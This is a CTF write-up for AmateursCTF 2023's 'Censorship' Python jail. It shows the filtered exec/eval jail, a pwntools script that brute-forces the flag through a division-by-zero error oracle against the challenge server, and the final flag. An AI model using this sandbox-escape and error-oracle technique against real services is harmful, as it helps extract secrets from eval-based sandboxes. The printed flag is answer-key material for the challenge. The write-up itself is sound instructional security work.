# Misc - Censorship (AmateursCTF 2023)

## Problem

We are faced with a Python jail problem:

```python
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            print(code)
            if "flag" in code or "e" in code or "t" in code or "\\" in code:
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)

```

## Solution

Since `flag` can be accessed via `_`, we simply need avoid using `e,t,\` characters. We note that if an exception was triggered, An error message will be printed. We can take advantage of this by considering the division-by-zero exception and perform `1/(ord(guess_char)-ord(_[flag_char_pos]))` to bruteforce the flag character by character:



```python
from pwn import *

r = remote('amt.rs', 31670)
print(r.recv(256))
flag = ''
print(len(flag))
flaglen = 44
# Length of flag is 44 (can try "_[??]" until string index out of range boundary found)
# Re-run a few times due to timeout, store partial result in "flag"
for j in range(len(flag), flaglen + 1):
    for i in range(0x100):
        r.sendline(f"1/({i}-ord(_[{j}]))".encode('utf-8'))
        res = r.recv(256).decode('utf-8')
        if 'division by zero' in res:
            flag += str(chr(i))
            print(flag)
            break

```

## Flag
amateursCTF{i_l0v3_overwr1t1nG_functions..:D}